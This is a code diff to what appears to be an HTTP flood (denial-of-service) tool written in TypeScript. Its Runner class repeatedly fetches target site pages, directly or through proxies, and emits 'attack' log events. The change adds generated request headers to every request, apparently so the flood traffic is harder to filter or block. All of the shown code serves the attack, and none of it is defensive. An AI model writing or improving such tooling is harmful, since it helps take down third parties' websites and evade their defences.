@@ -1,6 +1,7 @@
 import { EventEmitter } from 'events'
 import axios, { AxiosError } from 'axios-https-proxy-fix'
-import { TargetData, ProxyData, SiteData } from './worker.types'
+import { TargetData, ProxyData, SiteData } from './types'
+import { HttpHeadersUtils } from './utils/httpHeadersUtils'
 
 export class Runner {
   private sites: SiteData[]
@@ -48,7 +49,10 @@ export class Runner {
     let directRequest = false
     if (!this.onlyProxy) {
       try {
-        const response = await axios.get(target.site.page, { timeout: 10000 })
+        const response = await axios.get(target.site.page, {
+          timeout: 10000,
+          headers: HttpHeadersUtils.generateRequestHeaders()
+        })
         directRequest = response.status === 200
       } catch (e) {
         console.debug((e as Error).message)
@@ -64,7 +68,11 @@ export class Runner {
       }
       try {
         if (directRequest) {
-          const r = await axios.get(target.site.page, { timeout: 5000, validateStatus: () => true })
+          const r = await axios.get(target.site.page, {
+            timeout: 5000,
+            headers: HttpHeadersUtils.generateRequestHeaders(),
+            validateStatus: () => true
+          })
           this.eventSource.emit('attack', { url: target.site.page, log: `${target.site.page} | DIRECT | ${r.status}` })
         } else {
           if (proxy === null) {
@@ -88,6 +96,7 @@ export class Runner {
 
           const r = await axios.get(target.site.page, {
             timeout: 10000,
+            headers: HttpHeadersUtils.generateRequestHeaders(),
             validateStatus: () => true,
             proxy: proxyObj
           })
